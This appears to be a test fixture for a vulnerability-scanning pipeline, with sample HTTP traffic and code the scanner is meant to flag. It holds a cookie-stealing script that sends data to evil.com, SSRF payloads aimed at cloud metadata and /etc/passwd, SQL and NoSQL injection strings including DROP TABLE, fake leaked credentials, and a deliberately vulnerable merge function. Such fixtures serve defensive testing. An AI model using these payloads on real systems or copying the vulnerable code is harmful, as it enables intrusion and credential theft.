@@ -1,0 +1,207 @@
+# BurpOllama Test File
+# This simulates various vulnerability scenarios the pipeline should catch
+
+=== API Response with Sensitive Data ===
+HTTP/1.1 200 OK
+Content-Type: application/json
+X-Powered-By: Express
+
+{
+  "user": {
+    "id": 1,
+    "username": "admin",
+    "password": "P@ssw0rd123!",
+    "email": "admin@internal.company.com",
+    "role": "administrator",
+    "api_key": "sk-8x7f9a2k4m6n3p5q1r8t2v9w0y3j5h7",
+    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ",
+    "session": "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0"
+  },
+  "database": {
+    "host": "db.internal.local",
+    "name": "prod_db",
+    "user": "db_admin",
+    "password": "db_p@ss_2024!",
+    "connection": "mysql://db_admin:db_p@ss_2024!@db.internal.local:3306/prod_db"
+  },
+  "aws": {
+    "access_key_id": "AKIAIOSFODNN7EXAMPLE",
+    "secret_access_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+    "bucket": "company-secrets-prod",
+    "s3_url": "https://company-secrets-prod.s3.amazonaws.com/config.json"
+  }
+}
+
+=== Debug Endpoint Response ===
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html>
+<body>
+  <h1>Debug Console</h1>
+  <form action="/admin/debug/exec" method="POST">
+    <input type="text" name="cmd" value="ls -la" />
+    <input type="submit" value="Execute" />
+  </form>
+  <pre>
+    total 24
+    drwxr-xr-x  5 root root 4096 Jan 15 10:30 .
+    drwxr-xr-x  3 root root 4096 Jan 15 10:30 ..
+    -rw-r--r--  1 root root  142 Jan 15 10:30 .env
+    -rw-------  1 root root 1679 Jan 15 10:30 id_rsa
+    -rw-r--r--  1 root root  398 Jan 15 10:30 id_rsa.pub
+  </pre>
+  <script>
+    var token = document.cookie;
+    fetch('https://evil.com/steal?token=' + token);
+    eval(document.location.hash.substring(1));
+  </script>
+</body>
+</html>
+
+=== SSRF Vulnerable Endpoint ===
+POST /api/fetch HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{
+  "url": "http://169.254.169.254/latest/meta-data/",
+  "internal_api": "http://localhost:3000/admin/users",
+  "proxy": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+  "redirect": "file:///etc/passwd",
+  "download": "http://internal.admin.service/backup"
+}
+
+=== API with IDOR ===
+GET /api/v1/user/1337/profile HTTP/1.1
+Host: target.com
+Authorization: Bearer test_token
+
+GET /api/order/1001/details HTTP/1.1
+Host: target.com
+
+GET /admin/users?id=42&role=admin HTTP/1.1
+Host: target.com
+
+=== GraphQL Introspection ===
+POST /graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{
+  "query": "{ __schema { types { name fields { name } } } }",
+  "operationName": "IntrospectionQuery"
+}
+
+POST /graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{
+  "query": "mutation { login(username: \"admin\", password: \"admin123\") { token user { id role } } }"
+}
+
+=== .env File ===
+APP_ENV=production
+DB_HOST=db.internal.company.com
+DB_PORT=5432
+DB_NAME=production_db
+DB_USER=app_user
+DB_PASSWORD=supersecretpassword2024!
+REDIS_URL=redis://:redis_password@redis.internal:6379
+AWS_ACCESS_KEY_ID=AKIAEXAMPLE1234567
+AWS_SECRET_ACCESS_KEY=supersecretawskey1234567890123456
+JWT_SECRET=supersecret
+API_KEY=sk-live-8x7f9a2k4m6n3p5q
+SLACK_TOKEN=xoxb-123456789012-1234567890123-AbCdEfGhIjKlMnOpQrStUvWx
+GITHUB_TOKEN=ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890
+OPENAI_KEY=sk-proj-8x7f9a2k4m6n3p5q1r8t2v9w0y3j5h7
+
+=== Private Key ===
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA0gM5d3xK7O1h4J6m8kZ9L2p3Q5rY7tUyVnX8wB4cF6hJ
+kLmNoPqRsTuVwXyZ1234567890AbCdEfGhIjKlMnOpQrStUvWxYz12345678
+9aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890AbCdEfGhIjKlMnOpQrStUv
+-----END RSA PRIVATE KEY-----
+
+=== MongoDB Connection ===
+mongodb://admin:password123@cluster0.mongodb.net:27017/production?retryWrites=true&w=majority
+
+=== CORS Misconfiguration ===
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+
+=== NoSQL Injection Vector ===
+{
+  "username": { "$ne": "" },
+  "password": { "$ne": "" },
+  "role": { "$gt": "" },
+  "query": { "$where": "sleep(5000)" }
+}
+
+=== Prototype Pollution ===
+app.post('/api/merge', (req, res) => {
+  var target = {};
+  var source = req.body;
+  merge(target, source);
+  res.json(target);
+});
+
+// Merge function vulnerable to prototype pollution
+function merge(target, source) {
+  for (var attr in source) {
+    if (typeof target[attr] === 'object' && typeof source[attr] === 'object') {
+      merge(target[attr], source[attr]);
+    } else {
+      target[attr] = source[attr];
+    }
+  }
+  return target;
+}
+
+=== SQL Injection ===
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
+UNION SELECT username,password FROM admin_users--
+INSERT INTO users VALUES ('test', 'password') --
+DROP TABLE users; --
+
+=== Source Map Disclosure ===
+//# sourceMappingURL=/assets/app.8x7f9a2k.min.js.map
+//# sourceMappingURL=http://target.com/sourcemaps/main.js.map
+
+=== Hidden Endpoints ===
+<script>
+  var API_BASE = 'http://internal.api.target.com/v2';
+  var admin_url = '/admin/debug/console';
+  var swagger_url = '/api-docs';
+  var health_check = '/actuator/health';
+  var metrics = '/actuator/metrics';
+  var graphql_url = '/graphql';
+  var backup_url = '/backup/config.tar.gz';
+</script>
+
+=== Race Condition Scenario ===
+POST /api/coupon/redeem HTTP/1.1
+Content-Type: application/json
+
+{
+  "coupon_code": "FREE50",
+  "user_id": 123,
+  "amount": 50
+}
+
+POST /api/transfer HTTP/1.1
+Content-Type: application/json
+
+{
+  "from": "user_123",
+  "to": "user_456",
+  "amount": 1000
+}
+
+=== Cloud Storage Exposure ===
+https://company-backups.s3.amazonaws.com/
+https://storage.googleapis.com/company-prod-bucket/
+https://companyfiles.blob.core.windows.net/backups/
